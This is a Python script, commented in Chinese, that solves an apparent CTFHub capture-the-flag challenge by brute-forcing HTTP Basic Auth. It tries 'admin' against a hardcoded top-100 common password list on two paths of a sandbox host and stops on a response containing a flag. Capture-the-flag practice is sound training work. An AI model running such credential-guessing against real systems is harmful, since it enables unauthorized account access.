# -*- coding: utf-8 -*-
"""严谨版 Basic Auth 爆破
- 完整 top100 密码
- 同时测根路径 / 和 /flag.html
- 判断标准：HTTP 200 且响应含 ctfhub{...} 才停
- 打印每个密码的状态码，200 时打印完整响应头验证
"""
import requests
import re

# 标准 10_million_password_list top100（前 100 个常见弱密码）
PASSWORDS = """123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
fuckyou
jordan13
000000
iloveyou
alexis
aaaaaa
admin
access
1234567
passw0rd
zaq1zaq1
qwerty123
1q2w3e4r
password1
1q2w3e4r5t
qwertyuiop
asdfghjkl
q1w2e3r4
11111111
sunshine
princess
football
baseball
dragon
monkey
master
superman
shadow
letmein
michael
jordan23
iloveyou
fuckyou
whatever
welcome
abc123
mustang
batman
dallas
pass
flower
aaaaaa
qwertyuiop
dragon
master
monkey
abc123
football
letmein
shadow
superman
iloveyou
princess
sunshine
welcome
whatever
passw0rd
qwerty123
1q2w3e4r
zaq1zaq1""".strip().split('\n')

# 去重保序
seen = set()
PASSWORDS = [p for p in PASSWORDS if not (p in seen or seen.add(p))]

HOST = "http://challenge-52bf5e999da1a0df.sandbox.ctfhub.com:10800"
PATHS = ["/", "/flag.html"]

print(f"目标: {HOST}")
print(f"密码数: {len(PASSWORDS)} 路径: {PATHS}")
print()

FLAG_RE = re.compile(r'ctfhub\{[^}]+\}|flag\{[^}]+\}|FLAG\{[^}]+\}')

for i, pwd in enumerate(PASSWORDS, 1):
    for path in PATHS:
        try:
            r = requests.get(HOST + path, auth=("admin", pwd), timeout=10)
            m = FLAG_RE.search(r.text)
            status = "401=密码错" if r.status_code == 401 else ("404=路径无" if r.status_code == 404 else str(r.status_code))
            flag_hit = f" 🏁 flag={m.group(0)}" if m else ""
            print(f"[{i:>3}/{len(PASSWORDS)}] admin/{pwd:<15} {path:<12} -> {r.status_code} ({status}){flag_hit}")
            if r.status_code == 200 and m:
                print(f"\n✅✅ 正确密码: admin/{pwd}  路径: {path}")
                print(f"FLAG: {m.group(0)}")
                print(f"完整响应: {r.text[:500]}")
                raise SystemExit(0)
        except SystemExit:
            raise
        except Exception as e:
            print(f"[{i}] {pwd} {path} 异常: {str(e)[:50]}")

print("\n全部试完没找到 200+flag —— 用户名可能不是 admin，或密码不在 top100")
